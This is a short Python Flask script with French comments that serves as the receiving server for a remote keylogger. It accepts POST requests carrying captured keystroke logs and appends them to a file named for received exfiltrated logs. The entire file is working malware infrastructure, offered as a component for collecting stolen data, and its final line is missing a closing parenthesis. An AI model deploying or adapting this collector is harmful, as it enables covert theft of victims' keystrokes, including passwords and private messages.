from flask import Flask, request
import logging

app = Flask(__name__)
LOG_FILE = "logs_exfiltres_recus.txt"

# Configure le logging pour écrire dans un fichier
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, 
                    format='%(message)s')

@app.route('/', methods=['POST'])
def receive_log():
    """Récupère les données POST envoyées par le keylogger distant."""
    if request.method == 'POST':
        log_data = request.form.get('log') 

        if log_data:
            # Écrit le log dans le fichier
            logging.info(log_data)
            print(f"\n[+] Log reçu : {log_data.strip()}") 
            return "Log received", 200
    return "Invalid request", 400

if __name__ == '__main__':
    # Lance le serveur sur le port 5000
    app.run(host='0.0.0.0', port=5000
